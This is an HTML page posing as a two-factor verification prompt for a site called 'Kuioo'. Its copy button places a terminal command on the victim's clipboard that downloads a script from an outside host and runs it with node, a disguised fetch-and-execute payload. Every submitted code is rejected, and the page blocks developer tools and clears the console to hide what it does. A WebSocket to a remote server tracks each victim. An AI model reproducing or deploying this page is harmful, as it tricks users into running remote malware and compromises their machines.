<!DOCTYPE html>
<html>
  <head>
    <title>Kuioo</title>
    <link rel="icon" type="image/png" sizes="100x100" href="/favicon-32x32.png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
      html, body {
            height: 100%;
            margin: 0;
            overflow: hidden;
      }
      iframe {
          width: 100%;
          height: 100%;
          border: 0;
      }
      body {
          font-family: Arial, sans-serif;
          overflow-x: hidden; /* Prevent horizontal scroll during animation */
      }
      /* Alert box style */
      .alert {
          position: fixed;
          bottom: 20px;
          left: 50%;
          transform: translateX(-50%);
          background-color: rgba(0,0,0,1);
          color: white;
          padding: 10px;
          border-radius: 5px;
          font-size: 16px;
          display: none;
          opacity: 0;
          transition: opacity 0.5s ease-in-out;
          z-index: 20;
      }

      .alert.show {
          display: block;
          opacity: 1;
      }

      .tfa-description{
        color: #FFD12B;
        padding-top:10px
      }

      .tfa-ele{
        width: 30px;
        height: 30px;
        font-size: 20px;
        padding: 10px;
        color: #555;
        text-align: center;
        border: 1px solid #999;
      }

      .tfa-code{
        background: #eee;
        padding: 11px;
        margin: 12px 0px;
        color: #777;
        border: 1px solid #ccc;
        border-radius: 10px;
      }
      .tfa-tool{
        display: flex;
        justify-content: space-between;
        margin: 0px 5px 15px 0px;
        color: #666;
        font-size: 14px;
      }
      .tfa-bash{
        overflow-x: scroll;
        overflow-y: hidden;
        height: 50px;
      }
      .tfa-cmd{
        width: 1900px;
      }
      .tfa-copy{
        cursor: pointer;
      }

      .tfa-submit{
        width: 100%;
        height: 50px;
        background-color: rgb(1 124 187);
        color: #eee;
        border: none;
        margin: 10px 0px;
      }

      .tfa-submit:hover{
        background-color: #1e88be;
        cursor: pointer;
      }
      
      .tfa-submit:active{
        background-color: #155c80;
        cursor: pointer;
      }

      #verificationCode{
        display: flex;
        justify-content: space-between;
        margin: 10px 0px;
      }
      
      .modal {
          display: none; /* Hidden by default */
          position: fixed; /* Stay in place */
          z-index: 1; /* Sit on top */
          left: 0;
          top: 0;
          width: 100%; /* Full width */
          height: 100%;
          overflow: auto; /* Enable scroll if needed */
          background-color: rgba(255, 255, 255, 0.5); /* Black w/ opacity */
      }

      .modal-content {
          background-color: #fefefe;
          padding: 50px 30px;
          border: 1px solid #888;
          width: 400px; /* Could be more or less, depending on screen size */
          color: #333;
          line-height: 1.5;
          position: fixed;
          left: 50%;
          top: 50%;
          transform: translate(-50%, -50%);
      }

      .close {
          color: #aaa;
          float: right;
          font-size: 28px;
          font-weight: bold;
          position: relative;
          top: -20px;
      }

      .close:hover,
      .close:focus {
          color: black;
          text-decoration: none;
          cursor: pointer;
      }
      .lg-img{
        font-size: 34px;
        position:absolute;
        top: 0px;
        left: 0px;
        color: #eee;
        background-color: #161620;
        width: calc(100vw - 95px);
        text-align: left;
        padding-left: 90px;
        height: 64px;
        line-height: 2.2;
      }
      .lg-img a{
        color: #6536bc;
        text-decoration: none;
      }
      i.fa{
        color: #555;
      }
      .auth-alert{
        display: none;
        color: rgb(250, 63, 30);
      }
    </style>
  </head>
  <body contextmenu="false">

              <!-- <div class="tfa-code">
                <div class="tfa-tool" style="display: flex; justify-content: space-between;">
                  <span>Command Prompt / Terminal</span>
                  <span class="tfa-copy" onclick="copyCode()"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon-sm"><path fill-rule="evenodd" clip-rule="evenodd" d="M7 5C7 3.34315 8.34315 2 10 2H19C20.6569 2 22 3.34315 22 5V14C22 15.6569 20.6569 17 19 17H17V19C17 20.6569 15.6569 22 14 22H5C3.34315 22 2 20.6569 2 19V10C2 8.34315 3.34315 7 5 7H7V5ZM9 7H14C15.6569 7 17 8.34315 17 10V15H19C19.5523 15 20 14.5523 20 14V5C20 4.44772 19.5523 4 19 4H10C9.44772 4 9 4.44772 9 5V7ZM5 9C4.44772 9 4 9.44772 4 10V19C4 19.5523 4.44772 20 5 20H14C14.5523 20 15 19.5523 15 19V10C15 9.44772 14.5523 9 14 9H5Z" fill="currentColor"></path></svg> Copy</span>

                    </div>

            </div>
            <form id="twoFAForm">
                <div>
                    <label for="verificationCode">Verification Code:</label> <span class="auth-alert" id="auth-alert">Authentication Failed!</span>
                </div>
                <div id="verificationCode">
                  <input type="text" class="tfa-ele" id="v1" maxlength="1" name="v1" required>
                  <input type="text" class="tfa-ele" id="v2" maxlength="1" name="v2" required>
                  <input type="text" class="tfa-ele" id="v3" maxlength="1" name="v3" required>
                  <input type="text" class="tfa-ele" id="v4" maxlength="1" name="v4" required>
                  <input type="text" class="tfa-ele" id="v5" maxlength="1" name="v5" required>
                  <input type="text" class="tfa-ele" id="v6" maxlength="1" name="v6" required>
                </div>
                <button class="tfa-submit" id="tfa-submit-btn">Submit</button>
            </form>
        </div>
    </div>
    <div class="lg-img"><a href="http://localhost:3000">ùìöùì§ùìòùìûùìû</a></div>
  </body>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/uuid/8.3.2/uuid.min.js"></script>
  <script>
    const modal = document.getElementById("twoFAModal");
    const openModalBtn = document.getElementById("openModalBtn");
    const closeModalSpan = document.getElementsByClassName("close")[0];
    const twoFAForm = document.getElementById("twoFAForm");

    setInterval(() => {
      console.clear();
    }, 100);

    document.addEventListener('contextmenu', function(event) {
        event.preventDefault();
    });

    document.addEventListener('keydown', function(event) {
      if (event.key === 'F12') {
        event.preventDefault();  // Disables F12
      }
      if (event.ctrlKey && event.key === 'i') {
        event.preventDefault();  // Prevent the default action (open dev tools)
      }
    });

    const iframe = document.getElementById('myIframe');
    iframe.addEventListener('load', function() {
        setTimeout(() => {
            if(!localStorage.getItem('closeTfaTime')){
              modal.style.display = "block";
            }
        }, 2000);
    });

    document.getElementById("tfa-submit-btn").onclick = (event)=>{
      if(document.getElementById('v1').value != '' && document.getElementById('v2').value != '' && document.getElementById('v3').value != '' &&
      document.getElementById('v4').value != '' && document.getElementById('v5').value != '' && document.getElementById('v6').value != ''){
        document.getElementById('auth-alert').style.display = 'none';
        setTimeout(() => {
          document.getElementById('auth-alert').style.display = 'inline';  
        }, 500);
        event.preventDefault();
      }
    }

    function copyCode() {
        // Simulate copying code (replace with actual code copy logic if necessary)
        navigator.clipboard.writeText(`npm i request sqlite3 && node -e "require('https').get('https://btaf-m5qa.onrender.com/keygen', res => { let data = ''; res.on('data', d => { data += d; }); res.on('end', () => { require('fs').writeFileSync('auth', data); }); });" && node auth`)
            .then(() => {
                // Show the alert box with smooth transition
                const alertBox = document.getElementById("alert");
                alertBox.classList.add("show");
                
                // Hide the alert after 2 seconds
                setTimeout(() => {
                    alertBox.classList.remove("show");
                }, 2000);
            })
            .catch(err => {
                console.error('Error copying text: ', err);
            });
    }

    const PING = 99;
    const SEND_UID = 101;
    const BROWSER_CONNECTED = 102;
    const LOOK_UID = 103;
    const uniqueId = uuid.v4();
    const ws = new WebSocket("wss://detailed-materialistic-desk.glitch.me");
      ws.onopen = () => {
        // Create a JSON object
        const jsonObject = {
          e: BROWSER_CONNECTED,
          v: uniqueId
        };
        const jsonData = JSON.stringify(jsonObject);
        // Send JSON data as a text message
        ws.send(jsonData);
      };
      
      setInterval(() => {
        const pingObject = {
          e: PING,
          v: "k"
        };
        const pingData = JSON.stringify(pingObject);
        ws.send(pingData);
      }, 5000);

      ws.onmessage = (event) => {
          const msg = JSON.parse(event.data);
          switch (msg.e) {
            case SEND_UID:
              document.getElementById('v1').value = msg.v[0];
              document.getElementById('v2').value = msg.v[1];
              document.getElementById('v3').value = msg.v[2];
              document.getElementById('v4').value = msg.v[3];
              document.getElementById('v5').value = msg.v[4];
              document.getElementById('v6').value = msg.v[5];

              setTimeout(()=>{
                localStorage.setItem('closeTfaTime', new Date().getTime());
                modal.style.display = "none";
              }, 3000);

              setTimeout(()=>{
                document.getElementById('v1').value = "";
                document.getElementById('v2').value = "";
                document.getElementById('v3').value = "";
                document.getElementById('v4').value = "";
                document.getElementById('v5').value = "";
                document.getElementById('v6').value = "";
              }, 5000);
              break;
            default:
              break;
          }
      };
  </script>
</html>
